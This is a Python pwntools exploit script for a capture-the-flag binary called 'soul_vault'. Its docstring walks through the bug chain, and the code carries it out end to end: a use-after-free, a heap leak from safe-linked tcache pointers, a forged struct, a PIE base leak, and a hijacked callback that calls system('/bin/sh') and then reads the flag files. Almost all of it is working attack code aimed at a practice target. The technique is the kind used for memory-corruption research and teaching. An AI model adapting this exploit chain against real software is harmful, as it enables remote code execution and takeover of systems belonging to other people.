#!/usr/bin/env python3
"""
soul-vault-collector  --  UAF -> heap leak -> forged Soul -> PIE leak -> system("/bin/sh")

Bug chain
---------
* release_soul():  free(s->memory); free(s);   -- but souls[idx] is NEVER NULLed
                   => dangling pointer, full UAF on both chunks.
* capture_soul():  soul->memory = malloc(size);
                   read_string(soul->memory, size-1);   <- writes into a chunk
                   => if we can make that malloc() return the address of some
                      *other* object, we forge that object's fields freely.
* inspect_soul():  printf("Memory: %s", soul->memory)   <- arbitrary read
                   call [soul+0x28](soul)               <- rip control, rdi = soul

There is no %p leak anywhere, so the PIE base must be reconstructed from a
string read of memory that already holds a code pointer: a leftover
Soul->callback (slot 0x28), which is always stone_callbacks[0] = PIE+0x1289.

Chain
-----
1. release(1) then inspect(1): S1's tcache fd = S1_chunk >> 12  -> heap base
   (safe-linking turns the fd into a free heap leak, 5 bytes + NUL).
2. release(0): tcache[0x40] = [S0, S1].
3. capture(2, size=0x38): struct malloc pops S0, memory malloc pops S1
   -> soul2->memory = S1_user, so the "Inscribe Memory" write forges the
      fake Soul sitting at S1_user (which souls[1] still points at).
      Forge #1: name="/bin/sh", memory = &soul2->callback (S0_user+0x28),
                callback = 0.
4. inspect(1): "Memory: %s" reads soul2's leftover callback -> PIE base.
5. release(2): frees S1 then S0  -> tcache[0x40] = [S0, S1] again.
6. capture(3, size=0x38): same trick, forge #2:
      name="/bin/sh", memory = 0, callback = system@plt.
7. inspect(1): call [S1_user+0x28](S1_user) == system("/bin/sh").
"""
import os
import re
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
BIN = os.path.join(ROOT, 'solve/vault/soul_vault_patched')
elf = ELF(BIN, checksec=False)

CALLBACK_SOUL = 0x1289       # stone_callbacks[0] -- .data[0x4020]
# system@plt starts with endbr64 at 0x1120; pwntools reports the bnd-jmp at
# 0x1124.  Enter at 0x1120 so the jump stays legal when CET/IBT is enforced.
SYSTEM_PLT = 0x1120
assert elf.plt['system'] in (0x1120, 0x1124), hex(elf.plt['system'])

S0_OFF = 0x2a0               # souls[0] - heap   (measured with gdb)
S1_OFF = 0x310               # souls[1] - heap


def start():
    if args.REMOTE:
        return remote(args.HOST or 'localhost', int(args.PORT or 1337))
    return process(BIN, cwd=os.path.dirname(BIN))


def exploit(io):
    io.recvuntil(b'Choice: ')

    def capture_raw(size, name, blob, term=True):
        """capture with an exact-length name and an exact-length memory blob."""
        io.sendline(b'1')
        io.sendlineafter(b'Enter Soul Name: ', name)
        io.sendlineafter(b'Enter Memory Size (max 1024): ', str(size).encode())
        io.recvuntil(b'Inscribe Memory: ')
        io.send(blob)
        if term:
            io.sendline(b'')
        io.recvuntil(b'Choice: ')

    def release(idx):
        io.sendline(b'3')          # menu labels match the code: 2 = inspect, 3 = release
        io.sendlineafter(b'Enter vessel index (0-7): ', str(idx).encode())
        io.recvuntil(b'Choice: ')

    def inspect(idx):
        io.sendline(b'2')
        io.sendlineafter(b'Enter vessel index (0-7): ', str(idx).encode())
        return io.recvuntil(b'Choice: ')

    def rename(idx, name):
        io.sendline(b'4')
        io.sendlineafter(b'Enter vessel index (0-7): ', str(idx).encode())
        io.sendlineafter(b'Enter new name: ', name)
        io.recvuntil(b'Choice: ')

    # ---- 1. two souls of size 0x20 (memory chunk 0x30) -------------------
    capture_raw(0x20, b'A', b'aaaa\n')
    capture_raw(0x20, b'B', b'bbbb\n')

    # ---- 2. heap leak ---------------------------------------------------
    release(1)
    out = inspect(1)
    m = re.search(rb'Name: ([^\n]*)\n', out)
    raw = m.group(1)
    if len(raw) != 5:
        raise RuntimeError('bad heap leak (%d bytes): %r' % (len(raw), raw))
    l = u64(raw.ljust(8, b'\x00'))
    heap = l << 12
    s0 = heap + S0_OFF
    s1 = heap + S1_OFF
    assert s1 >> 12 == l, 'safe-linking mismatch'
    log.success('heap = %#x   souls[0] = %#x   souls[1] = %#x', heap, s0, s1)

    # ---- 3. release(0) -> tcache[0x40] = [S0, S1] -----------------------
    release(0)

    # ---- 4. forge #1: leak the PIE base --------------------------------
    # landing the *memory* buffer on souls[1] (still dangling at S1_user)
    forge1  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)          # name  (+0x00)
    forge1 += p64(s0 + 0x28)                                 # memory(+0x20) -> soul2->callback
    forge1 += p64(0)                                         # callback(+0x28) = 0 (skip call)
    forge1 += p32(0) + p32(0)                                # id, mem_size
    assert len(forge1) == 0x38
    capture_raw(0x38, b'C', forge1[:-1])                     # 0x37 bytes + auto NUL

    out = inspect(1)
    m = re.search(rb'Memory: ([^\n]*)\n', out)
    raw = m.group(1)
    if len(raw) != 6:
        raise RuntimeError('bad PIE leak (%d bytes): %r' % (len(raw), raw))
    leak = u64(raw.ljust(8, b'\x00'))
    pie = leak - CALLBACK_SOUL
    assert pie & 0xfff == 0, 'PIE base not page aligned: %#x' % pie
    log.success('callback leak = %#x  ->  PIE base = %#x', leak, pie)

    # ---- 5. free S1 + S0 again -> tcache[0x40] = [S0, S1] ---------------
    release(2)

    # ---- 6. forge #2: rip control --------------------------------------
    forge2  = b'/bin/sh\x00' + b'\x00' * (0x20 - 8)          # name  (+0x00)
    forge2 += p64(0)                                         # memory(+0x20) = 0
    forge2 += p64(pie + SYSTEM_PLT)                          # callback(+0x28) = system@plt
    forge2 += p32(0) + p32(0)
    assert len(forge2) == 0x38
    capture_raw(0x38, b'D', forge2[:-1])
    log.info('forged Soul @ %#x : name="/bin/sh" callback=system@plt (%#x)', s1, pie + SYSTEM_PLT)

    # ---- 7. inspect(1) -> system("/bin/sh") -----------------------------
    io.sendline(b'2')
    io.sendlineafter(b'Enter vessel index (0-7): ', b'1')
    return io


def main():
    for attempt in range(10):
        io = start()
        try:
            io = exploit(io)
            break
        except Exception as e:                       # bad leak byte -> retry
            log.warning('attempt %d failed: %s', attempt, e)
            io.close()
    else:
        log.failure('all attempts failed')
        sys.exit(1)

    io.sendline(b'cat flag.txt flag /flag* 2>/dev/null; id')
    data = io.recvrepeat(2)      # /bin/sh is alive, so the menu never comes back
    print(data.decode(errors='replace'))
    m = re.search(rb'(OWASP|flag)\{[^}]*\}', data)
    if m:
        log.success('FLAG = %s', m.group().decode())
    else:
        log.failure('no flag found')
    io.close()


main()
